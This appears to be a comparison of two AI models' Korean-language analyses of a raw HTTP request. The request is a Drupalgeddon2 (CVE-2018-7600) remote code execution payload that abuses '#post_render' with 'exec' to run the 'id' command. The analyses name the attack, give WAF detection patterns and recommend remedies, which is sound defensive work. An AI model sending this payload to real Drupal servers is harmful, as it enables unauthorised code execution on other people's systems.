Raw Example.
```
POST /user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
```

claude 
- 공격 이름: `Drupal Remote Code Execution`
- 판단 근거: `#post_render`와 `exec` 함수 사용, `drupal_ajax` 파라미터 존재
- 탐지 패턴: `mail[#post_render][]=exec`
- 설명: Drupal CMS의 취약점을 이용해 원격에서 임의의 코드를 실행하는 공격입니다.
- 대응 방법: Drupal 버전 업데이트, WAF에서 `#post_render` 및 `exec` 문자열 필터링, 입력값 검증 강화

gemini
- 공격 이름: `Drupalgeddon2`
- 판단 근거: `mail[#post_render][]=exec`, `mail[#type]=markup`, `mail[#markup]=id` 파라미터를 통해 원격 코드 실행 시도를 확인했습니다.
- 탐지 패턴: `mail\[#post_render]\[]=exec`, `mail\[#type]=markup`, `mail\[#markup]=`
- 설명: Drupalgeddon2(CVE-2018-7600)는 Drupal 7.x 및 8.x 버전의 취약점으로, 공격자가 악의적인 페이로드를 통해 원격 코드 실행을 가능하게 합니다.
- 대응 방법: Drupal을 최신 버전으로 업데이트하고, 웹 애플리케이션 방화벽(WAF)에서 위의 탐지 패턴을 이용하여 공격을 차단합니다.
